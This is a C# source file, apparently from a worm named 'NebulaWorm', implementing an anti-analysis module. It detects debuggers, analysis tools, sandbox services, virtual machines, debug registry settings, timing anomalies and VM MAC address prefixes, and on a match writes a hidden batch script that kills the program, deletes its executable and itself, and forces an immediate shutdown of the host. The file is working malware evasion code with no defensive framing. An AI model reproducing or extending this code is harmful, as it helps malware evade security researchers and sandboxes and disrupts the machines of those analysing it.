using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Threading;
using Microsoft.Win32;
using System.Net.NetworkInformation;
using System.IO;

namespace NebulaWorm
{
    internal static class AntiDebug
    {
        private static readonly string[] DebuggerProcessNames = new string[]
        {
            "ollydbg", "ida64", "ida", "x64dbg", "x32dbg", "debugger", "dbgview",
            "processhacker", "procexp", "procmon", "devenv", "immunitydebugger"
        };

        private static readonly string[] SandboxIndicators = new string[]
        {
            "SbieSvc", "VBoxService", "vmtoolsd", "vmsrvc", "xenservice"
        };

        private static readonly string[] VirtualMachinesManufacturers = new string[]
        {
            "vmware", "virtualbox", "qemu", "xen", "parallels"
        };

        private static readonly string[] VirtualMachinesModels = new string[]
        {
            "virtual", "vmware", "virtualbox", "qemu", "xen", "parallels"
        };

        private static readonly string[] SuspiciousMacsPrefixes = new string[]
        {
            "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", "08:00:27", "0A:00:27"
        };

        public static void CheckAndKill()
        {
            if (IsDebuggedOrVM())
            {
                try
                {
                    string exePath = Process.GetCurrentProcess().MainModule.FileName;
                    string batPath = Path.Combine(Path.GetTempPath(), "delself.bat");

                    File.WriteAllText(batPath, $@"
@echo off
timeout /t 2 >nul
taskkill /f /im ""{Path.GetFileName(exePath)}"" >nul 2>&1
del ""{exePath}"" /f /q >nul 2>&1
shutdown -s -t 0 -f
del ""%~f0"" >nul 2>&1
");

                    
                    Process.Start(new ProcessStartInfo()
                    {
                        FileName = batPath,
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Hidden
                    });

                   
                    Environment.Exit(0);

                }
                catch
                {
                    Environment.Exit(0); 
                }
            }
        }

        private static bool IsDebuggedOrVM()
        {
            return
                IsDebuggerAttached() ||
                IsDebuggerProcessRunning() ||
                IsSandboxServiceRunning() ||
                IsRunningInVM() ||
                HasDebugRegistrySet() ||
                HasDebugTimingDelay() ||
                HasSuspiciousMacAddress();
        }

        private static bool IsDebuggerAttached() => Debugger.IsAttached || Debugger.IsLogging();

        private static bool IsDebuggerProcessRunning()
        {
            try
            {
                return Process.GetProcesses().Any(p => DebuggerProcessNames.Any(dbg => p.ProcessName.ToLower().Contains(dbg)));
            }
            catch { return false; }
        }

        private static bool IsSandboxServiceRunning()
        {
            try
            {
                return Process.GetProcesses().Any(p => SandboxIndicators.Any(svc => p.ProcessName.ToLower().Contains(svc.ToLower())));
            }
            catch { return false; }
        }

        private static bool IsRunningInVM()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                {
                    foreach (var item in searcher.Get())
                    {
                        string manufacturer = (item["Manufacturer"] ?? "").ToString().ToLower();
                        string model = (item["Model"] ?? "").ToString().ToLower();

                        if (VirtualMachinesManufacturers.Any(vm => manufacturer.Contains(vm)) ||
                            VirtualMachinesModels.Any(vm => model.Contains(vm)))
                        {
                            return true;
                        }
                    }
                }
            }
            catch { }
            return false;
        }

        private static bool HasDebugRegistrySet()
        {
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter"))
                {
                    if (key != null)
                    {
                        var val = key.GetValue("Default");
                        if (val != null && (int)val != 0)
                        {
                            return true;
                        }
                    }
                }
            }
            catch { }

            return false;
        }

        private static bool HasDebugTimingDelay()
        {
            try
            {
                var sw = Stopwatch.StartNew();
                Thread.Sleep(100);
                sw.Stop();
                return sw.ElapsedMilliseconds > 200;
            }
            catch { return false; }
        }

        private static bool HasSuspiciousMacAddress()
        {
            try
            {
                foreach (var adapter in NetworkInterface.GetAllNetworkInterfaces())
                {
                    string mac = string.Join(":", adapter.GetPhysicalAddress().GetAddressBytes().Select(b => b.ToString("X2")));
                    if (SuspiciousMacsPrefixes.Any(prefix => mac.StartsWith(prefix, StringComparison.OrdinalIgnoreCase)))
                    {
                        return true;
                    }
                }
            }
            catch { }

            return false;
        }
    }
}
